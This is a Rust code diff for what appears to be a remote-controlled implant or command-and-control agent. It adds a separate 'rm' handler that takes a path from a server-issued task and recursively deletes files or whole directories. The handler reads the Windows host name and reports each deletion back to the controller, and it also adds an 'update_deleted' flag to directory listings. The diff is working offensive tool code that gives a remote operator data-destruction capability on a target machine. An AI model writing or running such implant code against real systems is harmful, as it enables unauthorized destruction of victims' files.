@@ -89,10 +89,62 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
                 "name": dir_name,
                 "parent_path": parent,
                 "success": true,
+                "update_deleted": true,
                 "files": file_entries
             },
             "user_output": format!("Listed {} entries in {}", file_entries.len(), abs_str),
             "status": "success"
+        }]
+    });
+    crate::transport::send_request(&serde_json::to_string(&resp)?)?;
+    Ok(())
+}
+
+fn handle_rm(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
+    let id = task.get("id").and_then(|v| v.as_str()).ok_or("missing id")?;
+
+    let raw_path = parsed_params.get("arg1")
+        .and_then(|v| v.as_str())
+        .unwrap_or(".");
+    let path_str = resolve_path(raw_path)?;
+    let path_obj = Path::new(&path_str);
+    let abs_path = if path_obj.is_absolute() {
+        path_obj.to_path_buf()
+    } else {
+        std::env::current_dir()?.join(path_obj)
+    };
+    let abs_str = abs_path.to_string_lossy().to_string();
+    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
+
+    let (output, status, removed) = if abs_path.exists() {
+        let result = if abs_path.is_dir() {
+            fs::remove_dir_all(&abs_path)
+        } else {
+            fs::remove_file(&abs_path)
+        };
+        match result {
+            Ok(_) => (
+                format!("Deleted: {}", abs_str),
+                "success",
+                serde_json::json!([{"host": hostname, "path": abs_str}]),
+            ),
+            Err(e) => (
+                format!("Failed to delete {}: {}", abs_str, e),
+                "error",
+                serde_json::json!([]),
+            ),
+        }
+    } else {
+        (format!("File does not exist: {}", abs_str), "error", serde_json::json!([]))
+    };
+
+    let resp = serde_json::json!({
+        "action": "post_response",
+        "responses": [{
+            "task_id": id,
+            "user_output": output,
+            "status": status,
+            "removed_files": removed
         }]
     });
     crate::transport::send_request(&serde_json::to_string(&resp)?)?;
@@ -116,9 +168,12 @@ pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::er
         serde_json::from_str(raw_params)?
     };
 
-    // ls has its own handler for file_browser support
+    // ls and rm have their own handlers for file_browser support
     if command == "ls" {
         return handle_ls(task, &parsed_params);
+    }
+    if command == "rm" {
+        return handle_rm(task, &parsed_params);
     }
 
     // Handle arg1
@@ -137,18 +192,6 @@ pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::er
 
 
     let output = match command {
-
-        "rm" => {
-            if path_obj1.exists() {
-                match fs::remove_file(&path_obj1) {
-                    Ok(_) => format!("Deleted file: {}", path1),
-                    Err(e) => format!("Failed to delete {}: {}", path1, e),
-                }
-            } else {
-                format!("File does not exist: {}", path1)
-            }
-        }
-
         "mkdir" => match fs::create_dir_all(&path_obj1) {
             Ok(_) => format!("Created directory: {}", path1),
             Err(e) => format!("Failed to create directory {}: {}", path1, e),
